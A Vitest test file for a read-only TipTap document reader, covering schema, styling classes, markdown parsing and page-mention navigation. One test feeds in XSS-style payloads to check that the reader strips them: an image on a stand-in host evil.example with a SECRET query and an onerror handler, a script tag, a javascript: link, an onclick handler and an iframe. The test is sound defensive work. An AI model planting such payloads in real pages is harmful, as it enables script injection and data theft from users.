// @vitest-environment jsdom
import { Editor, getSchema } from '@tiptap/core';
import { afterEach, describe, test } from 'vitest';
import { assert } from 'riteway/vitest';
import { SCHEMA_HASH, collabExtensions, hashProjection, projectSchema } from '@pagespace/editor/collab-schema';
import { documentProseClasses as classes } from './document-view-class';
import { mentionHrefOf, readerExtensions } from './document-prose';

const editors: Editor[] = [];

afterEach(() => {
  for (const editor of editors.splice(0)) editor.destroy();
  document.body.replaceChildren();
});

/** Whether the element carries every class of `classes` (TipTap adds its own, such as `mention`). */
const carries = (element: Element | null | undefined, classList: string): boolean =>
  element !== null && element !== undefined && classList.split(' ').every((cls) => element.classList.contains(cls));

/** A read-only reader over `content`, mounted in the document as the view mounts it. */
const read = (content: string, navigate: (href: string) => void = () => {}) => {
  const element = document.createElement('div');
  document.body.append(element);
  const editor = new Editor({
    element,
    extensions: readerExtensions({ navigate }),
    content,
    editable: false,
    injectCSS: false,
  });
  editors.push(editor);
  return editor.view.dom as HTMLElement;
};

describe('readerExtensions()', () => {
  test('the document schema', () => {
    const schema = getSchema(readerExtensions({ navigate: () => {} }));
    assert({
      given: 'the reader’s extensions',
      should: 'build exactly @pagespace/editor’s frozen document schema: same projection, same hash',
      actual: [
        hashProjection(projectSchema(schema)),
        JSON.stringify(projectSchema(schema)) === JSON.stringify(projectSchema(getSchema(collabExtensions()))),
      ],
      expected: [SCHEMA_HASH, true],
    });
  });

  test('stored document HTML', () => {
    const view = read(
      [
        '<h1>Plan</h1><h2>Why</h2><h3>Scope</h3><h5>Aside</h5>',
        '<p>Ship <strong>in October</strong>, <a href="https://example.com/a">see</a> and <code>bun run</code> <mark>now</mark>.</p>',
        '<ul><li><p>design</p></li></ul><ol><li><p>build</p></li></ol>',
        '<blockquote><p>quoted</p></blockquote><hr>',
        '<table><tbody><tr><th><p>Head</p></th></tr><tr><td><p>Cell</p></td></tr></tbody></table>',
      ].join(''),
    );
    const classOf = (selector: string) => view.querySelector(selector)?.className;
    assert({
      given: 'a stored document with headings, marks, lists, a quote, a rule and a table',
      should: 'draw each as its element with imago’s token classes on it',
      actual: [
        classOf('h1'),
        classOf('h2'),
        classOf('h3'),
        classOf('h5'),
        view.querySelector('strong')?.textContent,
        view.querySelector('a[href="https://example.com/a"]')?.textContent,
        view.querySelector('code')?.textContent,
        classOf('ul'),
        classOf('ol'),
        classOf('blockquote'),
        classOf('hr'),
        carries(view.querySelector('table')?.parentElement, classes.table),
        classOf('th'),
        classOf('td'),
      ],
      expected: [
        classes.h1,
        classes.h2,
        classes.h3,
        classes.h4,
        'in October',
        'see',
        'bun run',
        classes.ul,
        classes.ol,
        classes.blockquote,
        classes.hr,
        true,
        classes.headerCell,
        classes.cell,
      ],
    });
  });

  test('marks', () => {
    const view = read('<p><a href="https://example.com/a">see</a> <code>bun</code> <mark>now</mark></p>');
    const styled = (text: string) =>
      [...view.querySelectorAll('[class]')].find((element) => element.textContent === text && element !== view)?.className;
    assert({
      given: 'a link, inline code and a highlight',
      should: 'draw each run in its mark’s token classes',
      actual: [styled('see'), styled('bun'), styled('now')],
      expected: [classes.link, classes.code, classes.highlight],
    });
  });

  test('read-only', () => {
    const view = read('<p>locked</p>');
    assert({
      given: 'a document drawn by the reader',
      should: 'not be editable',
      actual: view.getAttribute('contenteditable'),
      expected: 'false',
    });
  });

  test('markup the schema does not know', () => {
    const view = read(
      [
        '<p>Look <img src="https://evil.example/p.png?d=SECRET" onerror="alert(1)"> here</p>',
        '<script>alert(2)</script>',
        '<p><a href="javascript:alert(3)">click</a> <span onclick="alert(4)">tap</span></p>',
        '<iframe src="https://evil.example/frame"></iframe>',
      ].join(''),
    );
    assert({
      given: 'stored HTML with a remote image, a handler, a script, a javascript: link and an iframe',
      should: 'drop each: no element loads anything, runs anything or links anywhere unsafe',
      actual: [
        view.querySelector('img, script, iframe'),
        view.querySelector('[src], [srcset], [onerror], [onclick]'),
        view.querySelector('a[href^="javascript"]'),
        view.textContent?.includes('click'),
      ],
      expected: [null, null, null, true],
    });
  });

  test('a file image', () => {
    const view = read('<img data-file-id="f1" alt="The chart">');
    const image = view.querySelector('img');
    assert({
      given: 'an image node, which holds a file id and never a URL',
      should: 'draw it with its alt text and no source to load, as classic does',
      actual: [image?.getAttribute('alt'), image?.getAttribute('src'), carries(image, classes.image)],
      expected: ['The chart', null, true],
    });
  });

  test('markdown documents', () => {
    const view = read('# Plan\n\n- one\n- two\n\n![remote](https://evil.example/x.png)');
    assert({
      given: 'a markdown-mode document with a remote image',
      should: 'read the markdown into the same schema, and load no image',
      actual: [
        view.querySelector('h1')?.textContent,
        [...view.querySelectorAll('ul li')].map((item) => item.textContent),
        view.querySelector('[src], [srcset]'),
      ],
      expected: ['Plan', ['one', 'two'], null],
    });
  });

  test('page mentions open in imago', () => {
    const opened: string[] = [];
    const view = read(
      '<p>See <a href="/dashboard/d2/p7" data-mention-type="page" data-page-id="p7" data-drive-id="d2">@Brief</a>.</p>',
      (href) => opened.push(href),
    );
    const mention = view.querySelector('a[data-page-id="p7"]') as HTMLAnchorElement;
    const event = new MouseEvent('click', { bubbles: true, cancelable: true });
    mention.dispatchEvent(event);
    assert({
      given: 'a click on a page mention carrying classic’s /dashboard address',
      should: 'open the page as imago’s object instead, and not follow the classic link',
      actual: [opened, event.defaultPrevented, carries(mention, classes.mention)],
      expected: [['/d2/files/p7'], true, true],
    });
  });
});

describe('mentionHrefOf()', () => {
  test('what is not a page mention', () => {
    const user = document.createElement('a');
    user.setAttribute('data-mention-type', 'user');
    user.setAttribute('data-user-id', 'u1');
    const noDrive = document.createElement('a');
    noDrive.setAttribute('data-mention-type', 'page');
    noDrive.setAttribute('data-page-id', 'p1');
    noDrive.setAttribute('data-drive-id', '');
    assert({
      given: 'nothing, a user mention and a page mention with no drive',
      should: 'open nothing',
      actual: [mentionHrefOf(null), mentionHrefOf(user), mentionHrefOf(noDrive)],
      expected: [null, null, null],
    });
  });
});
